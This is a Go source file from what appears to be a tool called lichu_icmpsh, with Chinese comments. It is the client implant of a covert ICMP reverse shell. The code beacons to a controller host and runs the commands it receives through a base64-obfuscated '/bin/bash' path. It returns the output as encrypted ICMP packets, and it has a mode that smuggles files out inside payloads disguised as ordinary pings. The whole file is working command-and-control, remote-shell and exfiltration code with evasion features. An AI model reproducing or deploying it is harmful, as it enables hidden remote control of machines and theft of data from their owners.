// lichu_icmpsh/shell/shell.go
package shell

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"io"
	"lichu_icmpsh/common"
	"lichu_icmpsh/common/crypto"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	DoneSignal          = "done"
	FixedPingPayloadLen = 56
	FixedPingHeaderLen  = 8
	FixedPingFooterLen  = 18
)

type Shell struct {
	icmpId       uint16
	Mode         string
	Interval     time.Duration
	cryptor      crypto.Cryptor
	token        []byte
	CryptoMode   string
	FileToSend   string
	FileHideMode bool
	common.Communicate
}

type ShellConfig struct {
	IP           net.IP
	Token        []byte
	CryptoMode   string
	IcmpID       uint16
	Mode         string
	Mtu          int
	Interval     time.Duration
	FileToSend   string
	FileHideMode bool
}

func NewShell(config ShellConfig) (*Shell, error) {
	router, err := routing.New()
	if err != nil {
		return nil, err
	}
	iface, gw, src, err := router.Route(config.IP)
	if err != nil {
		return nil, err
	}

	s := &Shell{
		Communicate: common.Communicate{
			Src:     src,
			Dst:     config.IP,
			Gateway: gw,
			Iface:   iface,
			Seq:     1,
			Mtu:     config.Mtu,
		},
		icmpId:       config.IcmpID,
		Mode:         config.Mode,
		Interval:     config.Interval,
		token:        config.Token,
		CryptoMode:   config.CryptoMode,
		FileToSend:   config.FileToSend,
		FileHideMode: config.FileHideMode,
	}

	if config.CryptoMode != "" {
		s.cryptor, err = crypto.New(config.CryptoMode, config.Token)
		if err != nil {
			return nil, fmt.Errorf("创建加密器失败: %w", err)
		}
	}

	handle, err := pcap.OpenLive(iface.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	s.PcapSendHandle = handle

	hwAddr, err := s.GetHwAddr()
	if err != nil {
		return nil, err
	}
	s.DstHwAddr = hwAddr
	return s, nil
}

// 文件发送主函数
func (s *Shell) SendFile() {
	file, err := os.Open(s.FileToSend)
	if err != nil {
		log.Fatalf("错误: 无法打开文件 '%s': %v", s.FileToSend, err)
	}
	defer file.Close()

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()

	fmt.Printf("[+] 连接目标: %s\n", s.Dst)
	fmt.Printf("[+] 传输文件: %s (大小: %s)\n", s.FileToSend, formatBytes(fileSize))

	var chunkSize int
	if s.FileHideMode {
		chunkSize = FixedPingPayloadLen - FixedPingHeaderLen - FixedPingFooterLen
		fmt.Printf("[+] 伪Ping载荷大小: %d 字节 (固定)\n", FixedPingPayloadLen)
		fmt.Printf("[+] 文件数据块大小: %d 字节 (固定)\n", chunkSize)
	} else {
		chunkSize = s.Mtu
		fmt.Printf("[+] 单包载荷 (MTU): %d 字节\n", chunkSize)
	}
	fmt.Printf("[+] 发包间隔: %v\n", s.Interval)

	fmt.Println("[+] 正在发送握手请求...")
	if err := s.SendICMP(s.token, s.icmpId, layers.ICMPv4TypeEchoRequest); err != nil {
		log.Fatalf("错误: 握手失败: %v", err)
	}
	time.Sleep(500 * time.Millisecond)
	fmt.Println("[+] 握手成功，开始文件传输...")

	buffer := make([]byte, chunkSize)
	var bytesSent int64 = 0
	ticker := time.NewTicker(s.Interval)
	defer ticker.Stop()

	for {
		bytesRead, err := file.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatalf("错误: 读取文件失败: %v", err)
		}

		<-ticker.C

		dataToSend := buffer[:bytesRead]

		if s.FileHideMode {
			dataToSend = s.createHiddenPayload(dataToSend)
		}

		if err := s.SendICMP(dataToSend, s.icmpId, layers.ICMPv4TypeEchoRequest); err != nil {
			log.Printf("警告: 发送数据块失败: %v", err)
		}

		bytesSent += int64(bytesRead)
		printProgress(bytesSent, fileSize)
	}

	printProgress(fileSize, fileSize) // 确保最后打印100%
	fmt.Println("\n[+] 文件传输完成。")
	fmt.Println("[+] 正在发送结束信号...")
	s.SendICMP([]byte(DoneSignal), s.icmpId, layers.ICMPv4TypeEchoRequest)
	fmt.Println("[+] 客户端退出。")
}

func (s *Shell) createHiddenPayload(data []byte) []byte {
	payload := make([]byte, FixedPingPayloadLen) // 56字节

	//时间戳结构 (8字节)
	// struct timeval { long tv_sec; long tv_usec; }
	now := time.Now()
	sec := now.Unix()
	usec := now.Nanosecond() / 1000

	// tv_sec (4字节)
	binary.LittleEndian.PutUint32(payload[0:4], uint32(sec))
	// tv_usec (4字节)
	binary.LittleEndian.PutUint32(payload[4:8], uint32(usec))

	footer := []byte{
		0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
		0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
		0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
	}
	footerStartOffset := FixedPingPayloadLen - len(footer)
	copy(payload[footerStartOffset:], footer)

	// 数据
	dataStartOffset := FixedPingHeaderLen // 8
	dataEndOffset := footerStartOffset    // 38
	copy(payload[dataStartOffset:dataEndOffset], data)

	// 随机数据填充空隙
	if len(data) < (dataEndOffset - dataStartOffset) {
		gapStart := dataStartOffset + len(data)
		gapEnd := dataEndOffset
		rand.Read(payload[gapStart:gapEnd])
	}

	return payload
}

// 进度条
func printProgress(current, total int64) {
	if total == 0 {
		return
	}
	percentage := float64(current) / float64(total) * 100
	barLength := 40
	filledLength := int(float64(barLength) * percentage / 100)

	bar := strings.Repeat("=", filledLength) + strings.Repeat(" ", barLength-filledLength)
	fmt.Printf("\r[+] 进度: [%s] %.0f%% (%s / %s)", bar, percentage, formatBytes(current), formatBytes(total))
}

func formatBytes(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d Bytes", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}

func (s *Shell) Handshake() error {
	return s.SendICMP(s.token, s.icmpId, layers.ICMPv4TypeEchoRequest)
}

func (s *Shell) handleCommand(encryptedCommand []byte) {
	commandDecrypt, err := s.cryptor.Decrypt(encryptedCommand)
	if err != nil {
		return
	}
	if len(commandDecrypt) == 0 {
		return
	}

	output, err := s.execute(commandDecrypt)
	if err != nil {
		output = []byte(err.Error())
	}
	output = append(output, []byte("\n")...)

	// 逐包加解密/编码解码
	var plaintextChunkSize int
	switch s.CryptoMode {
	case "base32":
		// Base32 膨胀率 8/5 = 1.6
		// 明文大小 = MTU / 1.6
		plaintextChunkSize = (s.Mtu * 5 / 8) - 8
	case "base64":
		// Base64 膨胀率 4/3 ≈ 1.34
		// 明文大小 = MTU / 1.34
		plaintextChunkSize = (s.Mtu * 3 / 4) - 4
	case "aes":
		// AES padding 膨胀，预留64字节
		plaintextChunkSize = s.Mtu - 64
	default: // none, xor
		plaintextChunkSize = s.Mtu - 16
	}

	if plaintextChunkSize <= 0 {
		plaintextChunkSize = 1
	}

	for i := 0; i < len(output); i += plaintextChunkSize {
		end := i + plaintextChunkSize
		if end > len(output) {
			end = len(output)
		}
		chunk := output[i:end]

		encryptedChunk, err := s.cryptor.Encrypt(chunk)
		if err != nil {
			fmt.Printf("错误: 加密结果分片失败: %v\n", err)
			return
		}

		err = s.SendICMP(encryptedChunk, s.icmpId, layers.ICMPv4TypeEchoRequest)
		if err != nil {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}

	if len(output) <= 1 {
		s.SendICMP([]byte{}, s.icmpId, layers.ICMPv4TypeEchoRequest)
	}
}

func (s *Shell) ListenICMPSession() {
	s.PcapSendHandle.SetBPFFilter("icmp")
	packetSource := gopacket.NewPacketSource(s.PcapSendHandle, s.PcapSendHandle.LinkType())

	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
		if icmpLayer == nil {
			continue
		}

		ip, _ := ipLayer.(*layers.IPv4)
		v, _ := icmpLayer.(*layers.ICMPv4)

		if v.Id != s.icmpId || !ip.SrcIP.Equal(s.Dst) {
			continue
		}

		if bytes.Compare(v.Payload, []byte("HANDSHAKE_OK")) == 0 {
			continue
		}

		s.handleCommand(v.Payload)
	}
}

func (s *Shell) StartBeaconLoop() {
	packetSource := gopacket.NewPacketSource(s.PcapSendHandle, s.PcapSendHandle.LinkType())
	commandChan := make(chan []byte)

	go func() {
		for packet := range packetSource.Packets() {
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			if ipLayer == nil {
				continue
			}
			icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
			if icmpLayer == nil {
				continue
			}

			ip, _ := ipLayer.(*layers.IPv4)
			v, _ := icmpLayer.(*layers.ICMPv4)

			if v.Id == s.icmpId && ip.SrcIP.Equal(s.Dst) {
				if bytes.Compare(v.Payload, []byte("HANDSHAKE_OK")) == 0 {
					continue
				}
				commandChan <- v.Payload
			}
		}
	}()

	ticker := time.NewTicker(s.Interval)
	defer ticker.Stop()

	go s.sendBeaconRequest()

	for {
		select {
		case <-ticker.C:
			go s.sendBeaconRequest()
		case encryptedCommand := <-commandChan:
			s.handleCommand(encryptedCommand)
		}
	}
}

func (s *Shell) sendBeaconRequest() {
	beaconPayload, err := s.cryptor.Encrypt([]byte("BEACON_REQUEST"))
	if err != nil {
		fmt.Printf("错误: 加密心跳请求失败: %v\n", err)
		return
	}
	err = s.SendICMP(beaconPayload, s.icmpId, layers.ICMPv4TypeEchoRequest)
	if err != nil {
		fmt.Printf("错误: 发送心跳失败: %v\n", err)
	}
}

func (s *Shell) execute(payload []byte) ([]byte, error) {
	cmdStr := string(bytes.TrimSpace(payload))
	if cmdStr == "" {
		return []byte{}, nil
	}
	encoded := "L2Jpbi9iYXNo"

	decodedShell, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("internal error: failed to decode sh path: %v", err)
	}
	cmd := exec.Command(string(decodedShell), "-c", cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {

		return output, err
	}
	return output, nil
}
